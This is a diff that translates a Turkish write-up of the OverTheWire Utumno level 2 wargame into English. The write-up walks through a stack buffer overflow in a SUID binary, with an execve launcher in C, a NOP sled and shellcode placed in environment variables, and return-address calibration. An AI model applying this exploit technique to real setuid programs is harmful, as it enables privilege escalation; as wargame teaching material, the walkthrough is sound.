@@ -1,65 +1,65 @@
-# OverTheWire — Utumno Level 2 Çözümü (utumno2 → utumno3)
+# OverTheWire — Utumno Level 2 Solution (utumno2 → utumno3)
 
-> Hedef: `utumno2` kullanıcısından `utumno3` kullanıcısının şifresini elde etmek.
-> Teknik: **klasik stack buffer overflow** (canary yok) + **executable stack** üzerinde
-> NOP sled + shellcode; `argc` kısıtını aşmak için `execve` ile crafted `argv`/`envp`.
+> Goal: Get utumno3 user's password from `utumno2`.
+> Technique: **Classic stack buffer overflow** (no canary) + NOP sled + shellcode on
+> **executable stack**; bypassing the `argc` constraint with a crafted `execve` `argv`/`envp`.
 
 ---
 
-## 1. Bağlantı
+## 1. Connection
 
 ```bash
 ssh utumno2@utumno.labs.overthewire.org -p 2227
-# şifre: ........   (bir önceki seviyeden)
+# password: ........   (from the previous level)
 ```
 
 ---
 
-## 2. Keşif (Recon)
+## 2. Recon
 
 ```bash
 ls -la /utumno/utumno2
-# -r-sr-x--- 1 utumno3 utumno2 12568 utumno2   <-- SUID utumno3, grup utumno2 = OKUNABİLİR
+# -r-sr-x--- 1 utumno3 utumno2 12568 utumno2   <-- SUID utumno3, group utumno2 = READABLE
 file /utumno/utumno2
 # setuid ELF 32-bit, dynamically linked, with debug_info, not stripped
 ```
 
-### strings — kritik ipuçları
+### strings — critical hints
 ```bash
 strings /utumno/utumno2
 ```
 - `strcpy`, `puts`, `exit`, `buffer`, `argv`, `argc`
-- Derleme bayrakları: **`-fno-stack-protector`** → **stack canary YOK!**
+- Compiler flags: **`-fno-stack-protector`** → **NO stack canary!**
 
-Çalıştırma denemeleri:
+Execution attempts:
 ```bash
 /utumno/utumno2            # "Aw.."  exit=1
 /utumno/utumno2 AAAA BBBB  # "Aw.."  exit=1
 ```
 
-### Mitigasyon kontrolü — stack çalıştırılabilir mi?
+### Mitigation check — is the stack executable?
 ```bash
 readelf -l /utumno/utumno2 | grep -A1 GNU_STACK
 # GNU_STACK ... RWE 0x10     <-- R+W+E => STACK EXECUTABLE!
 ```
-ASLR de kapalı (giriş banner'ından). Yani: **canary yok + executable stack + ASLR yok**
-= shellcode'u stack'e koyup return adresini oraya yönlendirebiliriz.
+ASLR also off (from login banner). So: **no canary + executable stack + no ASLR**
+= we can put shellcode on the stack (env) and redirect the return address there.
 
 ---
 
-## 3. Statik Analiz — `main`
+## 3. Static Analysis — `main`
 
 ```bash
 objdump -d -M intel /utumno/utumno2 | sed -n '/<main>:/,/^$/p'
 ```
 
-Sözde kod:
+Pseudocode:
 ```c
-int main(int argc, char **argv) {       // [ebp-0xc] = buffer (12 byte)
+int main(int argc, char **argv) {       // [ebp-0xc] = buffer (12 bytes)
     if (argc == 0) goto proceed;
     if (argc != 1) { puts("Aw.."); exit(1); }
     // argc == 1:
-    if (argv[0][0] == '\0') goto proceed;   // argv[0] BOŞ string ise geç
+    if (argv[0][0] == '\0') goto proceed;   // argv[0] is empty string -> continue
     puts("Aw.."); exit(1);
 proceed:
     strcpy(buffer, argv[10]);            // argv[10] = *(argv + 0x28)
@@ -67,70 +67,69 @@ proceed:
 }
 ```
 
-**İki önemli nokta:**
-1. **`proceed`'e ulaşmak için:** `argc == 0` **VEYA** (`argc == 1` ve `argv[0] == ""`).
-   Yani komut satırından normal argüman vererek (argc≥2) ULAŞILAMAZ.
-2. **Zafiyet:** `strcpy(buffer[12], argv[10])` — buffer 12 byte, canary yok.
-   - buffer: `[ebp-0xc]` → buffer'dan saved-ebp'ye 12 byte, +4 saved ebp = **return adresine offset 16**.
-   - Kaynak `argv[10]` = `*(argv + 0x28)` (40 = 10×4).
+**Two key points:**
+1. **To reach `proceed`:** `argc == 0` **OR** (`argc == 1` and `argv[0] == ""`).
+   Normal command-line arguments (argc≥2) cannot reach it.
+2. **Vulnerability:** `strcpy(buffer[12], argv[10])` — buffer is 12 bytes, no canary.
+   - buffer: `[ebp-0xc]` → 12 bytes to saved-ebp, +4 saved ebp = **return address offset 16**.
+   - Source `argv[10]` = `*(argv + 0x28)` (40 = 10×4).
 
 ---
 
-## 4. Saldırı Stratejisi
+## 4. Attack Strategy
 
-`argc` kısıtı normal argüman vermeyi engelliyor. Çözüm: hedefi **`execve`** ile,
-elle hazırlanmış `argv`/`envp` ile başlatan bir **launcher** yaz.
+The `argc` constraint prevents passing normal arguments. Solution: write a **launcher** that
+starts the target using `execve` with hand-crafted `argv`/`envp`.
 
-- `execve(path, argv={NULL}, envp=...)` ile `argc = 0` (teoride) → `proceed`'e geçer.
-- `argv[10]` overflow verisinin kaynağı → bunu **`envp`** içine yerleştiririz (kernel stack
-  düzeninde argv dizisinden hemen sonra envp gelir).
-- Shellcode'u büyük bir **NOP sled** ile başka bir env değişkenine koyarız (stack RWE).
-- Overflow payload = `16 bayt dolgu + return_adresi`; return adresi NOP sled'in ortasını
-  gösterir → kayar → shellcode → `setreuid` + `execve("/bin/sh")` → **utumno3 shell**.
+- `execve(path, argv={NULL}, envp=...)` → `argc = 0` (theoretically) → reaches `proceed`.
+- `argv[10]` is the source of overflow data → we put it in **`envp`** (in kernel stack layout,
+  envp comes right after the argv terminator).
+- We put shellcode with a large **NOP sled** in another env variable (stack is RWE).
+- Overflow payload = `16 bytes padding + return_address`; return address points to the NOP
+  sled midpoint → slides into shellcode → `setreuid` + `execve("/bin/sh")` → **utumno3 shell**.
 
-### Adres nasıl deterministik bulunur?
-ASLR kapalı olduğu için env string adresleri sabit. Ama tahmin etmek istemeyiz.
-**Hile:** Hedefle **birebir aynı** koşulda (aynı `argc=0` çağrısı, aynı `envp`,
-**aynı uzunlukta path** — `"/utumno/utumno2"` = 15 karakter) bir "printer" programını
-`execve` edip onun `environ[0]` adresini yazdırırız. ASLR kapalı + execfn uzunluğu eşit
-+ envp aynı ⇒ printer'ın `environ[0]` adresi = hedefin `environ[0]` adresi.
+### How to find the address deterministically?
+ASLR is off, so env string addresses are fixed. But we don't want to guess. **Trick:** run a
+"printer" program via `execve` under **exactly the same** conditions (same `argc=0` call, same
+`envp`, **same-length path** — `"/utumno/utumno2"` = 15 chars) and have it print `environ[0]`.
+ASLR off + matching execfn length + same envp ⇒ printer's `environ[0]` = target's `environ[0]`.
 
-> `/tmp/p2A7xK9mLq` (15 karakter) printer için seçildi ki AT_EXECFN string uzunluğu
-> `/utumno/utumno2` ile eşleşsin (yoksa env adresleri kayardı).
+> `/tmp/p2A7xK9mLq` (15 chars) was chosen as the printer path so the AT_EXECFN string length
+> matches `/utumno/utumno2` (otherwise env addresses would shift).
 
 ---
 
-## 5. KRİTİK Bug — Modern Kernel `argc=0`'ı Engelliyor (off-by-one)
+## 5. CRITICAL Bug — Modern Kernel Blocks `argc=0` (off-by-one)
 
-İlk deneme `rc=0`, shell yok. Sebep çok öğretici:
+First attempt gave `rc=0`, no shell. The reason is instructive:
 
-> **Linux ≥ 5.18** güvenlik düzeltmesi (commit `dcd46d897adb`, "exec: Force single empty
-> string when argv is empty"): `execve` boş `argv` ile çağrılırsa kernel **otomatik olarak
-> `argv[0] = ""` ekler** → `argc` **0 değil 1** olur.
+> **Linux ≥ 5.18** security fix (commit `dcd46d897adb`, "exec: Force single empty
+> string when argv is empty"): if `execve` is called with empty `argv`, the kernel
+> **automatically adds `argv[0] = ""`** → `argc` becomes **1, not 0**.
 
-Bunu printer'a `argc` yazdırtarak doğruladım: `ARGC=1`.
+Verified by having the printer print `argc`: `ARGC=1`.
 
-Bu, `argv[10]`'un hangi `envp` elemanına denk geldiğini **bir kaydırır**:
+This shifts which `envp` element `argv[10]` maps to by **one**:
 
-| Durum | Stack düzeni | `argv[10]` = |
-|-------|-------------|--------------|
-| `argc=0` (teori) | `[NULL][envp0][envp1]...` | `envp[9]` |
-| `argc=1` boş argv0 (gerçek) | `[""][NULL][envp0]...` | `envp[8]` |
+| Situation | Stack layout | `argv[10]` = |
+|-----------|-------------|--------------|
+| `argc=0` (theory) | `[NULL][envp0][envp1]...` | `envp[9]` |
+| `argc=1` empty argv0 (reality) | `[""][NULL][envp0]...` | `envp[8]` |
 
-İlk payload'ım `envp[9]`'daydı ama gerçekte `argv[10]=envp[8]="AA=AA"` okundu → taşma olmadı,
-`main` 0 döndü (`rc=0`). 
+My initial payload was in `envp[9]` but actually `argv[10]=envp[8]="AA=AA"` was read → no overflow,
+`main` returned 0 (`rc=0`).
 
-**Çözüm (sağlam):** payload'ı hem `envp[8]` hem `envp[9]`'a koy (ikisi de aynı string'e
-işaret etsin) → kernel davranışı ne olursa olsun `argv[10]` payload'ı bulur.
+**Solution (robust):** Put the payload in both `envp[8]` and `envp[9]` (both pointing to the
+same string) → works regardless of kernel behavior.
 
 ---
 
 ## 6. Final Exploit
 
-### Shellcode (utumno1'den, null-free + slash-free)
-`setreuid(geteuid(),geteuid()); execve("/bin/sh",["/bin/sh",0],0)` — 57 bayt.
+### Shellcode (from utumno1, null-free + slash-free)
+`setreuid(geteuid(),geteuid()); execve("/bin/sh",["/bin/sh",0],0)` — 57 bytes.
 
-### `ex.c` — launcher (find + run modları)
+### `ex.c` — launcher (find + run modes)
 ```c
 #include <unistd.h>
 #include <stdlib.h>
@@ -151,11 +150,11 @@ void build(unsigned int ret){
  memcpy(eggenv+4+SLED,sc,sizeof sc);
  eggenv[4+SLED+sizeof sc]=0;
  memset(payload,'B',16);
- *(unsigned int*)(payload+16)=ret;  // offset 16 = return adresi
+ *(unsigned int*)(payload+16)=ret;  // offset 16 = return address
  payload[20]=0;
  envp[0]=eggenv;
  for(int i=1;i<=7;i++) envp[i]="AA=AA";
- envp[8]=payload; envp[9]=payload;  // argc=0 VE argc=1 durumlarını da kapsa
+ envp[8]=payload; envp[9]=payload;  // cover both argc=0 AND argc=1 cases
  envp[10]=0;
 }
 int main(int argc,char**argv){
@@ -171,7 +170,7 @@ int main(int argc,char**argv){
 }
 ```
 
-### `pr.c` — adres + argc yazdırıcı
+### `pr.c` — address + argc printer
 ```c
 #include <stdio.h>
 extern char **environ;
@@ -181,19 +180,19 @@ int main(int argc,char**argv){
 }
 ```
 
-### Çalıştırma (otomatik kalibrasyon)
+### Execution (auto-calibration)
 ```bash
 gcc -m32 -o ex ex.c
 gcc -m32 -o /tmp/p2A7xK9mLq pr.c
 
 INFO=$(./ex find)                 # ARGC=1 ENVADDR=0xfffef4f6
 ENV0=$(echo "$INFO" | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
-RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")   # sled ortası -> 0xffff6a2a
+RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")   # sled midpoint -> 0xffff6a2a
 
 echo 'id; cat /etc/utumno_pass/utumno3' | ./ex run "$RET"
 ```
 
-Çıktı:
+Output:
 ```
 ARGC=1 ENVADDR=0xfffef4f6
 RET=0xffff6a2a
@@ -201,22 +200,21 @@ uid=16003(utumno3) gid=16002(utumno2) groups=16002(utumno2)
 ........
 ```
 
-> Not: `RET = environ[0] + 4 (EGG= atla) + 30000 (60KB sled'in ortası)`.
-> Büyük NOP sled, ±20KB'lik adres belirsizliğini soğurur; null-byte içermeyen bir adres
-> seçmek şart (strcpy null'da durur).
+> Note: `RET = environ[0] + 4 (skip "EGG=") + 30000 (midpoint of 60KB sled)`.
+> The large NOP sled absorbs ±20KB of address uncertainty; the chosen address must not contain
+> null bytes (strcpy stops at null).
 
 ---
 
-## Özet / Alınan Dersler
+## Summary / Lessons Learned
 
-| Konu | Not |
-|------|-----|
-| **Canary yok (`-fno-stack-protector`)** | `strcpy` ile saved return adresi doğrudan ezilir (offset 16) |
-| **Executable stack (`GNU_STACK RWE`)** | Shellcode stack'te (env var) çalıştırılabilir → ret2stack |
-| **`argc` kısıtı** | Normal argüman verilemez → `execve` ile crafted `argv`/`envp` gerekir |
-| **argc=0 → argv[10]=envp[k]** | Kernel stack düzeni: argv terminator'dan sonra envp gelir |
-| **Linux ≥5.18 boş argv → argc=1** | `execve(argv={NULL})` artık `argv[0]=""` ekler → indeks 1 kayar |
-| **Off-by-one savunması** | Payload'ı hem envp[8] hem envp[9]'a koy |
-| **Deterministik adres** | ASLR kapalı + eşit-uzunluk execfn + aynı envp → printer ile tam adres |
-| **NOP sled** | Büyük sled adres belirsizliğini tolere eder; ret-addr null-free olmalı |
-
+| Topic | Note |
+|-------|------|
+| **No canary (`-fno-stack-protector`)** | `strcpy` overwrites saved return address directly (offset 16) |
+| **Executable stack (`GNU_STACK RWE`)** | Shellcode in env var runs on stack → ret2stack |
+| **`argc` constraint** | Can't pass normal arguments → need `execve` with crafted `argv`/`envp` |
+| **argc=0 → argv[10]=envp[k]** | Kernel stack layout: envp comes after argv terminator |
+| **Linux ≥5.18 empty argv → argc=1** | `execve(argv={NULL})` now adds `argv[0]=""` → index shifts by 1 |
+| **Off-by-one defense** | Put payload in both envp[8] and envp[9] |
+| **Deterministic address** | ASLR off + matching execfn length + same envp → exact address via printer |
+| **NOP sled** | Large sled tolerates address uncertainty; ret-addr must be null-free |
